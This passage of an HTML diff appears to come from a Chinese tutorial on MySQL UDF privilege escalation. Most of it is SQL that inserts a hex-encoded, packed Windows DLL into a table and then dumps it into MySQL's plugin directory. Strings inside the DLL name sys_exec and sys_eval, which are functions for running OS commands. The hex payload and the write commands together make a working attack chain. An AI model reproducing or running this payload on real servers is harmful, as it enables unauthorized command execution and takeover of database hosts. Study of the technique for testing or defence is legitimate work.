B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925205929909.png" alt="image-20230925205929909"></p>
-<h5 id="5-1-8-update拼接剩余数据">5.1.8 update拼接剩余数据</h5>
-<pre class="line-numbers language-none"><code class="language-none">update udf set data = concat(data, 0x031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925205942481.png" alt="image-20230925205942481"></p>
-<h5 id="5-1-9-导出表中数据到系统磁盘">5.1.9 导出表中数据到系统磁盘</h5>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">data</span> <span class="token keyword">from</span> udf <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">"C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230925210437927.png" alt="image-20230925210437927"></p>
+<pre><code class="hljs plaintext">insert into udf(data) values (0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07);</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925205929909.png" alt="image-20230925205929909"></p>
+<h5 id="518-update拼接剩余数据">5.1.8 update拼接剩余数据</h5>
+<pre><code class="hljs plaintext">update udf set data = concat(data, 0x031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230925205942481.png" alt="image-20230925205942481"></p>
+<h5 id="519-导出表中数据到系统磁盘">5.1.9 导出表中数据到系统磁盘</h5>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> udf <span class="hljs-keyword">into</span> dumpfile "C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";</code></pre>
